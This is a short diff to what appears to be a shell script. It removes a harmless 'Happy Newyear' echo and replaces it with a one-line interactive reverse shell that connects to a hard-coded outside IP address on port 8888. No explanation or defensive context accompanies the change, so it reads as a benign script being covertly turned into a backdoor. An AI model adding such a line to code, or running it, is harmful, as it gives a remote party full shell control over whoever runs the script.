@@ -1,2 +1,1 @@
-#!/bin/bash
-echo "Happy Newyear"
+bash -i >& /dev/tcp/104.248.147.88/8888 0>&1
